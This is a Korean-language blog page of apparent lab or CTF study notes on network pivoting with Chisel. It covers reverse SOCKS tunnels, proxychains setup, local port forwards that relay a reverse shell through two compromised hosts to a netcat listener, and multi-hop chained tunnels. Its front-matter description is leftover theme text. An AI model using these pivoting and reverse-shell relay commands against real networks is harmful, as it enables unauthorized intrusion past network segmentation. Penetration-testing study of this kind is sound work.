---
layout: page
title: Tunnelling
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}



Chisel
https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz



### [Reverse Pivot]
Kali에서 Target으로 요청을 보낼 때

```bash
chisel server -p 8081 --reverse &
```


```bash
vim /etc/proxychains4.conf
```
![Pasted_image_20250708230909.png](/image/Pasted_image_20250708230909.png)
맨 밑에다 추가
```text
socks5 127.0.0.1 1080
```



```bash
# 연결된 동안에도 다른 작업해야하기 때문에 백그라운드로 실행
./chisel client 10.250.180.2:8081 R:socks &
```



```bash
proxychains -q curl 10.200.180.150
```
![Pasted_image_20250708231334.png](/image/Pasted_image_20250708231334.png)



공격자 서버에서는 10.200.180.150 ip에 바로 접근 할 수 없음.
10.250.180.200 서버에서는 10.200.180.150 으로 접근할 수 있기에 터널링을 통해 공격자 서버에서 바로 접근 가능하도록 하는 것.








### [Local Pivot]

대상에서 트래픽을 받을 때 (리버스 쉘 붙일 때)


```bash
chisel server -p 8000
```

```bash
chisel client [kali ip]:8000 9000:127.0.0.1:9010

# Target 2에서 붙을 chisl server
chisel server -p 8001
```
Target 1 에서 9000번 포트를 열고 Target 1의 9000번 포트를 통한 트래픽은 kali에서 127.0.0.1:9010 으로 나가라.



```bash
chisel client [Target 1 ip]:8001 9001:127.0.0.1:9000
```



```bash
rlwrap nc -lvnp 9010
```

```powershell
Test-NetConnection [Target 1 ip] -Port 9001
```
Target 2의 9001번 포트로 트래픽을 전송 -> Target 2으로 들어온 트래픽을 Target1 로 전송 -> Target1로 들어온 트래픽을 Kali로 전송 -> Kali로 들어온 트래픽은 Kali의 9010 포트로 나가셈.




## [Multi-hop Pivoting]

대상으로 트래픽을 보낼 때

### [[Multi-hope pivoting diagram]]



```bash
chisel server -p 9001 --reverse
```

```plaintext
# Target 개수에 맞춰줘야함

# 1번째 터널 입구
socks5 127.0.0.1 9999
# 2번째 터널 입구
socks5 127.0.0.1 8888
# 3번째 터널 입구
socks5 127.0.0.1 7777
```



Kali를 향한 `client`이자, Pivot 2를 위한 `server`.

```bash
# Kali로 접속 (1번 터널 생성)
./chisel client <Kali_IP>:9001 R:9999:socks

# Pivot 2의 접속을 대기
./chisel server -p 9002 --reverse
```



Target 1을 향한 `client`이자, Pivot 3을 위한 `server`.

```bash
# Pivot 1로 접속 (2번 터널 생성)
./chisel client <Target1_IP>:9002 R:8888:socks

# Pivot 3의 접속을 대기 (새로운 서버 실행)
./chisel server -p 9003 --reverse
```



Target 2를 향한 `client`.

```bash
# Pivot 2로 접속 (3번 터널 생성)
./chisel client <Target2_IP>:9003 R:7777:socks
```



터널링 
```bash
# Target 3로 curl 명령 날릴 수 있음
proxychains -q curl <Target3_IP>
```

